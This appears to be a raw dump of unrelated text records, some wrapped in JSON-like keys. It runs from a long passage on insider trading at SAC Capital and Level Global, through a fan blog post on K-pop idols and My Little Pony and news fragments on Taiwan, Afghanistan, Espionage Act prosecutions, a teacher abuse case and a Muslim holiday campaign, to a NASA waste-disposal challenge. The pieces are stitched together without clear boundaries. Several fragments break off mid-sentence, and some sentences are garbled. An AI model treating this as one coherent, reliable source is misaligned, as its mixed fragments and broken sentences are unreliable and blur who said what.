technology stocks, which were evaluated not on whether the company was a good long-term investment but on whether it was going to please investors in a given quarter. “We came to the conclusion that that was the way they [people who traded technology stocks] did business,” says one person close to events. “They were doing it for so long that it became normal.” “The line had been blurred,” says another hedge-fund executive. “It became extremely fast and furious, and all that mattered was who you were and what you knew.” He adds, “It was: What data points do you have? That was your Edge.” The trade that would reach all the way into the highest ranks of Level Global and up to powerful portfolio managers at SAC certainly involved Edge. Goyal, who had worked at Dell, developed a contact in Dell’s investor-relations department who began to pass along what Tortora testified was “very specific” inside information on Dell’s revenues and profits. Goyal would then send the information to Tortora, who would then pass it along to the rest of the group. Both Tortora and Adondakis later told a jury that the reason they gathered inside information and passed it to their friends, such as Horvath, was so that the analysts could relay it to the portfolio managers for whom they worked. The trade that would cause so much trouble for so many happened in late August 2008. Dell’s second quarter had finished at the end of July. It took time for the company to figure out what its revenues and profits were in a given quarter, but the Dell contact started telling Goyal that the company’s G.M., or gross margin—a measure of profitability—would be less than investors were expecting. In the volatile world of trading technology stocks, even a small “miss”—profits that are less than investors are expecting to see—can send a stock plummeting. Goyal told Tortora, and Tortora later testified that he had told others, including Adondakis. Indeed, the morning of August 5, after Goyal had had a late-night phone call with the contact, he called Tortora. While they were on the phone, Tortora e-mailed Newman bullet points from the conversation, including that it looked as if the gross margin was going to be lower than investors were expecting. “The Dell from Sandy [Goyal]?” asked Newman. “[Yes] on with him now,” Tortora responded. That day, Newman began to build a short position in Dell, according to trial testimony. Tortora also immediately forwarded that same e-mail to others, including Adondakis and Horvath. At Level Global, Chiasson eventually built a far bigger short position, at least in part due to Tortora’s information, according to the government. Adondakis testified that Chiasson knew exactly where the information was coming from. A few days after getting Tortora’s e-mail, Adondakis testified, he met with Chiasson and a senior analyst at Level Global named Greg Brenner in Chiasson’s office. They talked about the information, and Brenner said that, if the numbers Adondakis was getting were right, the Dell trade was the best idea at the firm. At another meeting in August, Chiasson, according to Adondakis, warned others that the large short position was based at least in part on information from a contact, so no one should discuss it outside the firm. As August 28, the date when Dell would announce its earnings, drew nearer, Chiasson wanted frequent updates, and it appears that he was updating his partner, David Ganek, too, but there is no proof Ganek knew where the information was coming from.\n\nOver at SAC, they were also talking Dell. On August 18, Horvath, three minutes after getting another update from Tortora, called his boss, Mike Steinberg, according to the government. A minute later, Horvath sent Steinberg an e-mail. The headline: “Pls keep the DELL stuff especially on the down low.” Steinberg returned, “I will.” The government later alleged that Steinberg began to short Dell’s stock that day. Even when you have inside information, trading technology stocks ahead of earnings isn’t a sure thing in the way that buying a stock before a big merger announcement is. It still takes work—and some luck—to figure out how the market will react to the numbers. The information is just Edge. It’s not certainty. And so, everyone was getting nervous. On August 22, a trader at Diamondback texted Adondakis. “Dell’s getting bigger,” he said, meaning that Chiasson was increasing the size of the bet. “I’m wearing depends now,” Adondakis replied. At SAC, Cohen himself was paying attention to the trade, because of a particular problem: another portfolio manager, Gabe Plotkin, was on the opposite side of Steinberg’s trade. Although Plotkin didn’t join SAC until 2006, he is a superstar there. He manages more than $1 billion of SAC’s capital and is hugely profitable for the firm. “The guy who is killing it at SAC Capital,” Reuters called him in 2011. On August 26, Steinberg wrote to Horvath and Plotkin, in an e-mail with the subject line “DELL,” “Guys, I was talking to Steve [Cohen] about DELL earlier today, and he asked me to get the two of you to compare notes before the print [meaning before Dell officially announced its earnings], as we are on opposite sides of this one. Gabe—we think GMs [gross margins] are at risk this qtr … ” “I do think that is the biggest risk,” Plotkin wrote back. Horvath responded, “I have a 2nd hand read from someone at the company—this is 3rd quarter I have gotten this read from them and it has been very good in the last two quarters. They are saying GMs miss by 50–80 bps [basis points] … Please keep to yourself as obviously not well known.” Steinberg responded, “Normally we would never divulge data like this, so please be discreet. Thanks.” The S.E.C. later alleged that 24 minutes after getting Horvath’s e-mail Plotkin began selling his Dell position and, as a result, was able to avoid $2 million in losses. A day later, Steinberg e-mailed Horvath again. With the subject line “Dell action,” he asked, “Have u double checked JT [Tortora] this week?” Horvath responded, “Yes he checked in couple days ago, same read no change.” Steinberg shorted more Dell, according to the government. When Dell’s number came out, the gross margin was even lower than what Goyal had told Tortora—so the stock began plummeting and eventually fell more than 13 percent. Chiasson wrote to Adondakis, “Nice call.” Indeed: according to the government, Level made more than $53 million in illegal profits on that one trade. At Diamondback, Newman, who had taken a much smaller position, made almost $3 million for the fund. Ron Dennis wrote to Tortora, “You da man. I owe you.” Tortora checked in with Horvath. “You there on Dell,” he asked. Horvath responded, “nice man, you nailed it.” The government later alleged that Steinberg’s fund earned $1 million in illegal profits.\n\nUltimately, the government indicted Chiasson, Newman, and Horvath not just for the big Dell trade but also for conspiring to swap information on other stocks, including Nvidia. After a month-long trial, a jury found Chiasson and Newman guilty after deliberating for just two days. (Both men are appealing the verdict.) Six weeks before the trial, in late September 2012, Horvath pleaded guilty to insider trading in both Dell and Nvidia. In his plea, he said that he provided information to his portfolio manager—Mike Steinberg—who then traded on his tips. Although the judge ruled that there was an “inference” that Ganek “was aware of the source and nature of this information,” Adondakis testified that he had never told Ganek his source. Ganek was not charged. Immediately after the raid, he hired an outside law firm to do an investigation and told investors that he was “highly confident that my conduct in leading the firm and its investment process was lawful and ethical at all times,” but he couldn’t say the same for Chiasson. On February 11, 2011, he sent a letter to investors telling them he was shutting Level Global down, which he called a “very difficult and painful personal decision.” Diamondback ultimately paid a big price, too, even though the senior people were never implicated. The firm eventually struck a non-prosecution agreement with the government, meaning that it wouldn’t be held criminally liable, and it paid the government $9 million, which is small for an insider-trading fine. But a combination of some rocky performance and the continued torrent of bad news about the industry-wide insider-trading investigation finally caused investors to say, Enough. At the end of 2012, Diamondback announced that it was closing its doors, too. As for Loch Capital, soon after the raid the McSweeneys reportedly told investors that they were not the focus of the investigation, but by the end of the year Loch Capital had closed, too. In late March, Mike Steinberg was indicted for insider trading on Dell and Nvidia. He is—by a long shot—the person closest to Cohen who has been caught up in the probe. Once Steinberg’s name started appearing in connection with Horvath, many had the sense he was next. Including Steinberg. Which is why, according to Reuters, he jumped from hotel to hotel for weeks, hoping to avoid the embarrassment of being arrested in front of his wife and two children, while his lawyer tried to arrange a deal wherein prosecutors allowed him to turn himself in. This tactic had worked for Chiasson; when F.B.I. agents showed up at his Upper East Side Manhattan apartment, the doorman handed them a note, instructing them to call Chiasson’s lawyer. (Chiasson turned himself in later that day.) Steinberg was not so lucky. At six A.M. on March 29, agents arrested him at his $8 million Park Avenue apartment. He had just returned from a trip to Florida, while his family, thankfully, had stayed behind. Steinberg’s lawyer, Barry Berke, says, “We are preparing for a full-fledged and full-throated defense, and we have every expectation that he will be vindicated.” Gabe Plotkin, who also allegedly traded Dell shares at SAC, has not been charged with any wrongdoing, but even the mention of his name is potentially a much bigger problem for the firm. Not only is he a big deal in terms of the profits he makes, but, as one person familiar with SAC says, Plotkin has also been in front of investors as one of the faces of the firm. And SAC is defending him vigorously. “Gabe Plotkin has not been accused of wrongdoing and has done nothing wrong,” says an SAC spokesperson. “He has built a successful career on a commitment to sound fundamental research.” Maybe so. SAC insists that its compliance system is extraordinary and emblematic of the new SAC. But the first line of defense against insider trading is supposed to be the portfolio managers, who are required to go to the compliance lawyers immediately if they even suspect they’ve gotten inside information. Another hedge-fund executive, when asked what the compliance lawyers should have done after seeing Horvath’s e-mails, laughs. “After the lawyer had a heart attack or lost his lunch, you mean?” And so, what some others in the industry can’t understand is why the Dell trade wasn’t a red alert for SAC’s lawyers long before the government got there. Implausible Deniability\n\nIn the fall of 2012, just after Chiasson and Newman’s trial began, the government unveiled yet another shocker. On November 20, the S.E.C. filed a complaint against a former SAC portfolio manager named Mathew Martoma, alleging that he’d orchestrated the largest insider trade in history—$276 million in illegal profits and avoided losses, more than five times the size of the Dell trade—by getting advance information about the clinical trial of an experimental Alzheimer’s drug. He allegedly used that information to persuade Cohen to take a big long position in the stocks of the two drugmakers—the Dublin-based Elan, and Wyeth, a New Jersey company (eventually acquired by Pfizer)—that were developing the drug. In July 2008, a week before the results of the clinical trial were due out, Martoma helped persuade Cohen to do a 180 and not only sell his huge stake in the two stocks but bet against them with big short positions. In late 2011, F.B.I. agents confronted Martoma on the artificial front lawn of his $1.9 million, 8,000-square-foot home, in Boca Raton, Florida, while his wife, Rosemary, took their three children inside. Agent Matthew Callahan pressed him to become an informant against Cohen; when he refused, the agents leaned on him, reminding him of the damning evidence they had against him and of how much time he might spend away from his family if he were sent to prison (as much as 45 years). Martoma then fainted, but, soon on his feet, he remained defiant. “The charges unsealed today describe cheating coming and going,” Bharara told the press on November 20, 2012, the same day the S.E.C. also filed a complaint. “Specifically, insider trading first on the long side, and then on the short side.” It is this trade that accounts for the lion’s share—more than $600 million—of the $616 million fine that SAC agreed to pay the S.E.C. In the narrative of how the government continued to pick away at SAC, this particular case came out of left field. The investigation into the Elan trade was not begotten by Karl Motey, or Wes Wang, or Richard Choo-Beng Lee. It did not involve Primary Global Research, or even a technology stock, for that matter. But in the narrative of the evolution of SAC—and, perhaps, the evolution of insider trading—Martoma makes perfect sense to Wall Street insiders. He didn’t drop off a big bag of cash to get advance word of an impending merger or pay big commissions to get an early call on a stock from a Wall Street analyst. He was a smart, hardworking guy who did an enormous amount of legwork—and who also allegedly used his expertise to cultivate a source who then gave him that extra bit of Edge. Born Ajai Mathew Mariamdani Thomas to Indian immigrants, Martoma was raised in Florida and graduated summa cum laude from Duke in 1995. According to The New York Times, he studied biomedicine, ethics, and public policy, worked briefly at the National Human Genome Research Institute, in Washington, and spent a year and a half at Harvard Law School before dropping out to go to business school at Stanford. He worked at a small Boston hedge fund called Sirios Capital, and then joined SAC in 2006. Well coiffed and always dressed in neatly pressed slacks, he was “articulate, well put together, smooth, and calm,” according to someone who knows him, who adds, “You can see how he would be persuasive in a credible way.”\n\nElan, the company that got Martoma in trouble, had a history of controversy, “decades of accounting fraud, overstated clinical trials, and blowups,” says a hedge-fund manager, and indeed, in 2005, Elan had to pay the S.E.C. $15 million for violating the anti-fraud statutes of the federal securities laws. But by 2007 it was making a comeback thanks to excitement about an experimental Alzheimer’s drug called bapineuzumab, or “bapi,” that it was developing with Wyeth. Results from the drug’s clinical trials, which would show whether it was safe and effective, were due in the summer of 2008. On the Street, Elan’s stock generated strong feelings. Detractors said the company simply couldn’t be trusted. On top of that, experienced health-care traders are always suspicious of companies that claim success with Alzheimer’s drugs, because they think the area is rife with pipe dreams. By 2007, Elan’s stock was “a battleground,” says another trader. “People were getting into fights at medical meetings. Guys were getting really violent, not in a physical way, but verbally.” And it was a battleground within SAC, because the other health-care pods there wanted not to own the stock but to sell it short, according to one person familiar with the situation. The dissenters included a health-care pod run by David Munno and Benjamin Slate. But Martoma remained an enthusiastic buyer of Elan and Wyeth—he included Elan on the list of his best ideas that he submitted to Cohen—and Cohen “centerbooked” them, meaning that he bought their stocks in the “Cohen account.” Perhaps not surprisingly, Martoma was not well liked within SAC. “A lot of guys hated him,” recalls the person familiar with events. “They thought he was cocky, he had Steve’s ear on this giant trade, and he didn’t talk to anyone about it. People thought he was sneaky and selfish.” But none of that—the skepticism of his fellow portfolio managers, the sketchiness of the situation—seemed to matter to Cohen, who was with Martoma, and in a huge way. According to the government, SAC accumulated more than $700 million worth of Elan and Wyeth stock, almost $400 million of which was held in the Cohen account. The government would later allege that it wasn’t just Martoma’s knowledge of this industry or his hard work that led to the giant long position. Rather, he had cultivated a relationship with Dr. Sidney Gilman, a neurology professor at the University of Michigan—and the chairman of the committee that was monitoring the bapi clinical trial. Martoma had met Gilman through an expert-network firm called the Gerson Lehrman Group, and SAC wound up paying him $108,000 in total for his insights. The government alleges that Gilman, who came to regard Martoma as a “friend and a pupil,” began leaking positive information from the clinical trials to him as early as 2007, even once sending him non-public data labeled “For Your Eyes Only.” (“Gilman made a tremendously bad judgment and he’ll live with that,” says his lawyer, Marc Mukasey.)\n\nThroughout the summer of 2008, Elan’s stock continued to soar. But the smart money didn’t believe bapi was going to pan out, and they couldn’t figure out why Cohen was long. “We were all saying, Why did SAC take a position this big? What the fuck does he know that we don’t?” says another trader. The dissent within SAC reached a fever pitch, too. On March 26, 2008, Munno and Slate sent Cohen an e-mail that read, “ELN, (important, please read) negative reads from company and other buysiders.” It listed reasons why they were concerned. Cohen forwarded the e-mail to Martoma, who responded, “I read the message. Nothing worrisome here. Let me know when you are free to discuss in detail.” Cohen stayed long. In an instant message to another SAC trader, he wrote that Martoma was expecting positive news from the clinical trial, and he was the one “closest” to the situation. “Closer,” says a former SAC trader, can be a euphemism for having inside information. On June 17, Elan and Wyeth announced the preliminary results of the clinical trial. The headlines were positive, and although skeptics thought the data was sketchy, both stocks shot higher still. After that, Cohen “indicated he would no longer consider any investment ideas in Elan or Wyeth” from Munno and Slate, according to the S.E.C. Final results from the clinical trial were due on July 29. At some point in late June, Gilman started getting even more information about the drug’s progress because he was selected to present the final clinical-trial results. In the end, the news wasn’t good, although the companies tried to spin it positively. It turned out that patients taking bapi over a long period of time didn’t improve. On Sunday, July 13, Martoma and Gilman spoke for about an hour and 40 minutes. Four days later, Gilman received a PowerPoint from Elan in an e-mail labeled, “Confidential, do not distribute.” It contained detailed information about the results of the clinical trial. Gilman sent the PowerPoint to Martoma, according to the government, who then called him to request the password needed to open the encrypted file. On the morning of Sunday, July 20, Martoma e-mailed Cohen. He asked, “Is there a good time to catch up with you this morning? It’s important.” Cohen sent his cell-phone number, and at 9:43 A.M. the two spoke for about 20 minutes. “Every time there is a fraud, SAC says, We have amazing compliance!” observes another hedge-fund manager. “But the only question that matters is: Were the compliance people on the phone that Sunday morning? If they don’t show up for that, who cares that there are a million people in compliance?”\n\nThe following Monday, July 21, Cohen’s head trader began selling SAC’s huge stakes in Elan and Wyeth, according to the S.E.C. He did his best to do so in a way that wouldn’t be detected inside or outside SAC. Or as the head trader told Martoma in an e-mail, “Obviously no one knows except me you and [Cohen].” By July 29, the date of the announcement of the clinical-trial results, SAC had a big short position in Elan and Wyeth. On July 30, the first trading day after the companies disclosed the negative trial results, Elan’s stock fell about 42 percent and Wyeth’s stock dropped about 12 percent. The government alleges that by selling, and then shorting, SAC was able to avoid $194 million in losses and make another $83 million in profits. That year, Martoma was paid a $9.4 million bonus. In the fall of 2008, the regulator for the New York Stock Exchange noted the unusual trading leading up to the announcement of the results. According to Bloomberg, the S.E.C. figured out how much money SAC had made and began sending out subpoenas, requesting phone records and trading data, and looking through every phone call made by someone with an Elan connection to someone at SAC. They found Gilman and Martoma and compared the dates of the phone calls with those of SAC activity on the stocks. In the hedge-fund grapevine, there’s another theory floating around: Gilman was very active in speaking to hedge funds and had a reputation for being too chatty, according to one source. The speculation is that a trader who was facing legal problems on another trade turned the government on to Gilman. In any event, after Gilman was contacted by the F.B.I. in the summer of 2012, he agreed to give testimony in exchange for not being prosecuted. In 2010, Martoma was fired from SAC for poor performance. An SAC employee called him a “one trick pony with Elan,” according to the government. As of this writing, he evidently continues to refuse to cooperate, saying he is innocent. Recently he changed lawyers, causing insiders to speculate that he intends to fight.",
  "latent_23723": "So RadioLab put out a fantastic episode of their podcast the other day all about K-Pop stars. These are girls that from a young age are put under a contract and trained night and day to become teen pop sensations. They put in long hours, go through diets, dance routines and the gamut of all kinds of beautification techniques. But part of their contract is that they do not date or get married or have any romantic relations at all.\n\nThere’s an economic reason for that. The (predominantly) male demographic that consumes the media these idols make do NOT like them dating. The RadioLab story told about how it got leaked that one of these idols had had a relationship, and the popularity of that singer dropped considerably.\n\nWhy?\n\nBecause it removes the fantasy. The male audience can daydream about these girls possibly being with them because their available. The entire industry is fueled by this fantasy of absurdly cute girls that are unavailable—but still—there might be a \"chance.\"\n\nSo when one of these cute girls says something like: “I’ve never been kissed.” There’s a small feeling in their audience’s mind that fantasizes “What if I was her first kiss?” It's never going to happen, but there’s a monetary value in being able to have that fantasy.\n\nAnd this isn’t just Korea, Japan has this culture of virgin pop stars as well. And there are boy bands that are also put under the same “do-not-date” scrutiny.\n\nFrom my western perspective, this behavior seems bizarre to me. Why should it matter if a singer you listen to is dating/married? Shouldn’t you be happy for them? Why does the monetary value of a pop singer depend on whether she is “available” or not?\n\nBut this got me thinking: where do I see this behavior in western culture? I have a firm belief that humans have been humans for a long time and we really aren’t that different from each other. So this sentiment should be expressed in some way in the western world as well. Right?\n\nAnd then it hit me: Flash Sentry.\n\nAdmit it. You hate this guy.\n\nMy Little Pony makes no effort to disguise that it’s not a fantasy. It’s a cartoon about horses. But there is still this mild idea that these girls ponies don’t date. That they are pure. And that something would be lost if these characters were to find love.\n\nThere is a brony subculture that likes the idea of treating MLP like some kind of dating sim. Here are all these nice girls and wouldn’t it be nice to be around them?\n\nBut, if they were to have an on-screen boyfriend, would the “popularity” of that character drop?\n\nI feel like we saw this with Flash Sentry. Twilight was our wonderful adorkable girl we liked and possibly fantasized about, but then this other guy came on the scene and ruined our (already impossible) chances.\n\nThe point I’m trying to make here is that maybe we’re not so different from the guys that worship these K-Pop idols. Would we feel betrayed if all the mane six suddenly started being romantically involved with somepony? Would the popularity of the show go down because even though we know this is a fantasy, we still had entertaining thoughts elsewhere?\n\nOr am I totally wrong?\n\nI’d love to hear y’alls thoughts.",

But he stressed that any decision to do so was up to the resident and the primary responsibility remained with Taiwan itself.\n\nTaiwan has been working to develop its own defense equipment and last year allocated an initial budget for a submarine program, but technology transfer is critical to the success of such projects and it has yet to receive key foreign technological support.\n\nTrump adviser and China hawk Peter Navarro, who has produced books and multipart television documentaries warning of the dangers of China’s rise, has suggested stepped up engagement with Taiwan, including assistance with its submarine development program.\n\nThe Obama administration notified Congress a year ago of a $1.83 billion arms sale package for Taiwan, including two frigates, antitank missiles, amphibious assault vehicles and other equipment, drawing an angry response from China.",

Ramadan, the Islamic holy month of fasting, can be held in the summer one year but take place in the winter years later.\n\nWhen the Prophet Mohammad’s birthday should be celebrated in the Islamic calendar differs depending on the denomination. Sunni Muslims observe the holiday on the 12th of the Islamic month Rabi’ al-awwal, while Shi’ites observe it on the 17th.\n\nBut the historical birthday of Mohammad is April 26, 570. Qayyoom said holding a national celebration on that day will allow American Muslims to celebrate at the same time every year.\n\n“We want one day, an annual holiday like Christmas,” he said.\n\nWhile Qayyoom plans to formally announce his campaign April 22 at the second planned Interfaith Harmony and World Peace event in Jackson Heights, he said he is already starting it.

He said if Muslims have a holiday when they can hold parades and games every year and their non-Muslim neighbors can celebrate, it can bring an understanding between the peoples.\n\n“Prophet Muhammad said, ‘I am not the prophet of only Muslims. I am the prophet of all human beings,’” he said.\n\nQayyoom said he has planned for this campaign to be a long one, but he hopes it will give the Muslim population in America a voice.\n\n“I think it will work,” Qayyoom said. “It will take a little time.”\n\nReach reporter Rebecca Henely by e-mail at rhenely@cnglocal.com or by phone at 718-260-4564.",

When President Obama was campaigning and even when he first took office, he claimed that it was a priority to support whistleblowing activities. And yet, as President, he has been ridiculously aggressive in pushing vindictive criminal lawsuits against whistleblowers -- often by abusing the Espionage Act. The Espionage Act is supposed to be used against. But the Obama Justice Department has used it over and over again against whistleblowers in a purely vindictive manner. In fact, he's used it to bring charges against whistleblowers. This strategy turned out to be a disaster in the Thomas Drake case (which was initiated by President Bush, but continued with strong support by President Obama), where the case completely collapsed, once it became clear that the charges were nothing but a vindictive attack on a whistleblower.Apparently the Obama administration has not learned its lesson. It has now used the Espionage Act to go after a former CIA agent, John Kiriakou, who blew the whistle on the CIA's waterboarding torture regime. This now makes it theEspionage Act prosecution of a whistleblower brought by the Obama administration. All other presidents before him used it a total of 3 times. As the Government Accountability Project notes , the really stunning thing in all of this is that Kiriakou will be the only person prosecuted in relation to the use of waterboarding -- and simply for blowing the whistle on it.Something seems very, very wrong about this.\n\nFiled Under: doj, espionage act, obama, torture, whistleblowing",

The news and stories that matter, delivered weekday mornings.\n\nJan. 19, 2017, 2:19 PM GMT / Updated Jan. 19, 2017, 4:19 PM GMT By Ahmed Mengli and F. Brinley Bruton\n\nKABUL, Afghanistan — Shamim Seyal should be a symbol of all that Afghanistan has achieved with the help of the U.S.\n\nInstead, the principal of a large school for girls is on the shifting frontline of America’s longest war, an example of the raw resilience needed to simply survive in the country.\n\n\"We need to push the Taliban back and we can’t afford to let them re-dominate the country\"\n\n“Sometimes there are Taliban checkpoints and sometimes Afghan government checkpoints beside the school,” said Seyal, who runs the Fatima Al-Zahra School in the city of Kunduz, which has been fought over for years and briefly fell into the militant group's hands in September 2015.\n\nSeyal and her family have been targeted by the insurgents, who often try to kill prominent women and destroy girls’ schools. They have also been forced to flee their home after being threatened by the Taliban.\n\nIt was not supposed to be this way when President Barack Obama took office in 2009.\n\nAs a candidate, he pledged to run extremists out of the country.\n\nAfghan Taliban fighters in the western province of Farah in November 2015. JAVED TANVEER / AFP - Getty Images\n\nBut to the dismay of millions of Afghans, the war has not been won or even finished. In fact, many believe the group, which harbored Osama bin Laden before and after the 9/11 attacks, is resurgent.\n\nAnalysts say they pose a threat not only to Afghanistan but potentially elsewhere in the world.\n\nHere is a glimpse of Obama’s legacy in Afghanistan, and what the president is bequeathing President-elect Donald Trump.\n\nWhat did Obama pledge to do?\n\nAs a candidate, Obama complained that his predecessor George W. Bush had missed crucial opportunities in the region.\n\n“We could have deployed the full force of American power to hunt down and destroy Osama bin Laden, al Qaeda, the Taliban, and all of the terrorists responsible for 9/11, while supporting real security in Afghanistan,” he said during a speech on July 15, 2008.\n\nAs president, Obama declared, he would “make the fight against al Qaeda and the Taliban the top priority that it should be. This is a war that we have to win.”\n\nThe U.S. “will be taking the fight to al-Qaeda in Afghanistan and Pakistan,” he said.\n\nSo how did that fight go?\n\nBin Laden was killed in a U.S. raid in Pakistan on May 1, 2011, so that was a major success.\n\nThe death of the Afghan Taliban’s leader, Mullah Akhtar Mohammad Mansour, in a U.S. drone strike on May 21, 2016 — again in Pakistan — dealt the insurgents another blow.\n\nAccording to Lisa Curtis, a senior research fellow at conservative Heritage Foundation think tank, the Obama administration was successful in putting al Qaeda \"on its back feet and disrupting al Qaeda safe havens.\"\n\nBut when it came to pushing back the Taliban back and strengthening Afghan authorities “there has not been success,” she said.\n\nCurtis pointed to Obama’s 2009 decision to launch a troop surge in Afghanistan during a speech at West Point.\n\n“In the very next breath he announced the date those forces would withdraw,” she said. “It is not an effective strategy to tell the enemy when you are going to retreat.”\n\nAnd Afghanistan remains one of the most dangerous countries on the planet when it comes to violent extremism. In September, the top U.S. commander in the country Gen. John Nicholson, estimated that 20 of the 98 U.S. or U.N.-designated terrorist organizations were in the Afghanistan-Pakistan region.\n\n“This is highest concentration … in any area in the world,” he said.\n\nWhat's the Pakistan connection?\n\nAt the beginning of his presidency, Obama decried nuclear-armed Pakistan’s history of meddling in the affairs of its weaker neighbor and allegedly aiding and sheltering some terror groups while going after others. Pakistani officials have repeatedly denied these charges.\n\nIn 2008, then-candidate Obama promised to focus the fight on the tribal regions on Pakistan, “where terrorists train and insurgents strike into Afghanistan.”\n\n“Make no mistake — we can’t succeed in Afghanistan or secure our homeland unless we change our Pakistan policy,” he said.\n\nAfghan security forces patrol in Kunduz in April 2015. Omar Sobhani / Reuters\n\nAccording to Curtis, Pakistan has not changed its ways enough, and she advised the new administration to “take certain risks” with the government there.\n\n“I’m not talking about making an enemy out Pakistan … (but) we need to start enforcing the conditions on [U.S.] aid and be willing to push the envelope to a certain degree.”\n\nShe suggested aid to the country and its major non-NATO ally status — a designation given to close military allies — “may be in jeopardy if they don’t demonstrate that they are in fact an ally in the fight against terrorism.”\n\nHow much territory do insurgents control?\n\nThe majority of Afghans — nearly 70 percent — live in districts under Afghan government control or influence, according to U.S. military estimates in late 2016. Nearly 10 percent are under insurgent control or influence, while the rest of the country lives in so-called “contested areas” — essentially up for grabs.\n\nThat the government in Kabul still does not control swaths of the country is a cause for alarm, said Haroun Mir, a political analyst at the Afghanistan Center for Research and Policy Studies.\n\n“We have tremendous security challenges,” he said, pointing to the fact that the Taliban has challenged the Afghan security forces and gained the territory over the last few years — especially since the U.S. officially ended its combat mission in the country in December 2014.\n\nAfghan Interior Ministry spokesman Sediq Sediqqi dismissed these fears as overblown, however, saying the Taliban does not control “any strategic places\" in the country.\n\nThe insurgents launch attacks on other areas from these low-population areas, he said.\n\n“When it comes to control of the territory, of course the Afghan government, the Afghan people, they have full control of their territory,” he said.\n\nSediqqi did acknowledge that the government has seen “an increase in the level of attacks by the Taliban.\"\n\nThe c-word\n\nSecurity cannot be discussed without also talking about corruption.\n\nFor one thing, as Kabul loses legitimacy through corruption, the Taliban often gains it through their own parallel systems of government and justice.\n\n“That is a dangerous thing,\" said Mir, the analyst. That’s because while extremely harsh, the Taliban are seen as more efficient and less corrupt than the Afghan government.\n\n\"They are famous for their delivery of justice,” he said.\n\nMir is far from alone in sounding the alarm over graft and impunity.\n\nRelated: 12 Ways Your Tax Dollars Were Squandered in Afghanistan\n\nJohn F. Sopko, the special inspector general for Afghanistan reconstruction (SIGAR) — the government's leading oversight authority on reconstruction in the country — has called corruption “widespread and rampant.”\n\n“Corruption and poor leadership go hand in hand in Afghanistan,” he said in a speech on Jan. 11.\n\nIn 2014, Gen. John Allen, the ex-head of the International Security Assistance Force in Afghanistan, called corruption — not the Taliban — the existential threat to Afghanistan.\n\nHow many U.S. troops are still in Afghanistan?\n\nWhile the U.S. ended its official combat role in Afghanistan in Dec. 2014, there are still around 8,500 U.S. troops there.\n\nA U.S. soldier patrols across barren foothills outside of Forward Operating Base Shank near Pul-e Alam, Afghanistan, on March 30, 2014. Scott Olson / Getty Images\n\nThe Americans both advise Afghan troops in their fight against the Taliban and, separately, hunt and kill al Qaeda and ISIS-linked affiliated fighters.\n\nThis is down from more than 100,000 in 2010.\n\nWhat about dollars and cents?\n\nMore than $115 billion taxpayer dollars have been spent in Afghanistan since 2002, with another $7.5 billion appropriated but not yet spent, according to SIGAR.\n\nInternational donors have said they would provide financial support to the country and its security forces until 2020, with the U.S. making up the lion’s share at around $5 billion per year.\n\nThe U.S. has stumped up more than $64 billion since 2002 — $3.45 billion in 2016 alone — to support the Afghan security forces.\n\nAre people still dying?\n\nYes, lots of them. According to the U.N., the first six months of 2016 saw the highest number of civilian casualties on record since 2009 — 1,601 killed and 3,565 injured. Nearly one-in-three casualties were children, while more than 500 were women.\n\nWhat does Trump and his team have to do?\n\nThe Heritage Foundation's Curtis says the first thing the new administration needs to acknowledge is that \"the security situation is extremely vulnerable\" in Afghanistan and the strategy will have to be reassessed.\n\n\"We need to push the Taliban back and we can’t afford to let them re-dominate the country,\" she said. \"Both because that will turn back all the social and economic gains that have been made in the country but also because they will then provide safe havens for international terrorists intent on attacking us.\"",

Lewis on Thursday to sentence Zurenko to house arrest for her young children and claimed she was 'truly in love with her victims,' Penn Live reports.\n\n'I am ashamed to be here,' Zurenko told the judge.

You used my love.'\n\nFollowing her arrest, Dauphin County's District Attorney's Office said Zurenko abused one of the girls from January of 2013 to October of 2016. The girl, who has since graduated from the school, was underage at all times.\n\nZurenko allegedly went on to abuse the second girl from 2015 to 2016, taking photographs of her half-nude and of them together while they had sex.\n\nShe sent her nude 'selfies' and also admitted to taking photographs of the student on her phone.\n\nThey are alleged to have sex in a number of different locations including Zurenko's home.

  "latent_24472": "NASA awarded a total of $30,000 in prize money to five members of the public who helped develop methods for astronauts to safely expel physical waste in space. Thatcher Cardon, an Air Force officer, family practice physician and flight surgeon, claimed the top prize of $15,000 for his \"MACES Perineal Access & Toileting System (M-PATS)\" design. Photo courtesy of NASA\n\nFeb. 16 (UPI) -- NASA announced the winners of its \"Space Poop Challenge\" to develop a solution to help astronauts safely expel physical waste in spacesuits.\n\nUsing crowdsourcing site HeroX NASA awarded a total of $30,000 in prizes to five members of the public, including two doctors, a dentist, an engineer and a product designer.\n\nAstronauts now wear diapers while conducting launch and entry activities and in-space activities which often require the use of a space suit for about 10 hours at a time.\n\nNASA began to seek a more high tech solution that would provide a healthy or protective option for astronauts to expel waste for periods longer than one day, as they begin to travel beyond low earth orbit.\n\n\"What this challenge set out to crowdsource was a complete system inside a space suit that collects human waste for up to 144 hours and routes it away from the body, without the use of hands,\" NASA said. \"The system had to operate in the conditions of space - where solids, fluids, and gases float around in microgravity (what most of us think of as \"zero gravity\") and don't necessarily mix or act the way they would on earth.\"\n\nThatcher Cardon, an Air Force officer, family practice physician and flight surgeon, claimed the top prize of $15,000 for his \"MACES Perineal Access & Toileting System (M-PATS)\" design, inspired by minimally invasive surgical techniques.\n\n\"I never thought that keeping the waste in the suit would be any good,\" Cardon told NPR. \"So I thought, 'How can we get in and out of the suit easily?'\"\n\nCardon's design allows astronauts to change their underwear and pass items such as inflatable bedpans and diapers through a small airlock in the suit.\n\n\"I thought about what I know regarding less invasive surgeries like laparoscopy or arthroscopy or even endovascular techniques they use in cardiology — they can do some amazing things in very small openings,\" he said. \"I mean, they can even replace heart valves now through catheters in an artery. So it should be able to handle a little bit of poop!\"\n\nThe second place prize of $10,000 was awarded to a group known as Space Poop Unification of Doctors, consisting of a physician, an engineering professor and a dentist.\n\nThe trio developed an air-powered system to push waste away from the astronaut's body and pour it in different parts of the suit.\n\n\"More specifically, that air is created by passive and active normal body movements of the astronaut,\" team leader Jose Gonzales said.\n\nProduct designer Hugo Shelley was awarded $5,000 for placing third with his \"SWIMSuit — Zero Gravity Underwear,\" which disinfects and stores waste inside the suit.\n\n\"Making something as comfortable as possible I thought was fairly important...a lot of your mechanism really has to be in, effectively, the first few millimeters away from the skin,\" he said.\n\nOrion crew survival system project manager at NASA Dustin Gohmert said the winning ideas will be combined to create a system that will actually be used in space.\n\n\"Optimistically this will never be used, because it is a contingency scenario that something catastrophic has happened,\" he said. \"But this will be on Orion and should something happen, and should it be called on to save the crew, this will be there and at their disposal.\"",
